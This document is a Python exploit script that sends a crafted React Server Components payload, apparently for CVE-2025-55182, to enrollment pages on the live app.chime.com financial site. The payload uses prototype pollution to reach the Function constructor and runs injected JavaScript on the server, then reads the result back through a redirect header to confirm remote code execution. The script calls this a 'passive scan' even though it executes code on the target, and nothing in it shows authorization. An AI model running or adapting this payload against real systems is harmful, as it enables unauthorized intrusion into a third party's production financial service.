import requests, re, json, sys
from urllib.parse import unquote

# Runner info
try:
    ip_info = requests.get("https://ipinfo.io/json", timeout=5).json()
    print(
        f"[*] Runner IP: {ip_info.get('ip')} | Country: {ip_info.get('country')} | Org: {ip_info.get('org')}"
    )
except:
    print("[!] Could not get IP info")

TARGET_BASE = "https://app.chime.com"
BOUNDARY = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

# Step 1: Baseline GET -- can we even reach Chime?
print("\n=== BASELINE ===")
for path in ["/", "/enroll/account"]:
    try:
        r = requests.get(
            f"{TARGET_BASE}{path}",
            headers={"User-Agent": UA},
            timeout=15,
            allow_redirects=False,
        )
        print(
            f"GET {path}: {r.status_code} | Size: {len(r.text)} | Server: {r.headers.get('Server', '-')} | CF-Ray: {r.headers.get('CF-Ray', '-')}"
        )
        if r.status_code == 403:
            print(f"  [!] Blocked. Body snippet: {r.text[:200]}")
    except Exception as e:
        print(f"GET {path}: FAILED - {e}")

# Step 2: Passive scan -- expression eval 1337+42, expect 1379
print("\n=== CVE-2025-55182 PASSIVE SCAN ===")
expr_prefix = (
    "var res=String(1337 + 42);"
    "throw Object.assign(new Error('NEXT_REDIRECT'),"
    "{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});"
)
part0 = (
    '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
    '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
    + expr_prefix
    + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
)

body = (
    f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
    f'Content-Disposition: form-data; name="0"\r\n\r\n'
    f"{part0}\r\n"
    f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
    f'Content-Disposition: form-data; name="1"\r\n\r\n'
    f'"$@0"\r\n'
    f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
    f'Content-Disposition: form-data; name="2"\r\n\r\n'
    f"[]\r\n"
    f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
)

headers = {
    "Next-Action": "dontcare",
    "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
    "Accept": "text/x-component",
    "User-Agent": UA,
    "Origin": TARGET_BASE,
}

paths = ["/enroll/account", "/enroll/phone", "/enroll/address", "/enroll/password", "/"]

for path in paths:
    url = f"{TARGET_BASE}{path}"
    headers["Referer"] = url
    try:
        r = requests.post(
            url, headers=headers, data=body.encode(), timeout=15, allow_redirects=False
        )
        print(f"\nPOST {path}: HTTP {r.status_code}")
        for hdr in [
            "X-Action-Redirect",
            "Location",
            "Content-Type",
            "Server",
            "CF-Ray",
            "x-action-revalidated",
        ]:
            val = r.headers.get(hdr, "")
            if val:
                print(f"  {hdr}: {val[:300]}")
        redirect = r.headers.get("X-Action-Redirect", "")
        match = re.search(r"/login\?a=([^;\"&]+)", redirect)
        if match:
            result = unquote(match.group(1))
            print(f"  [!!!] OUTPUT: {result}")
            if result.strip() == "1379":
                print(f"  [!!!] CONFIRMED VULNERABLE: 1337+42 = 1379")
        # Body snippet
        print(f"  Body[0:300]: {r.text[:300]}")
    except Exception as e:
        print(f"POST {path}: FAILED - {e}")

print("\n=== DONE ===")
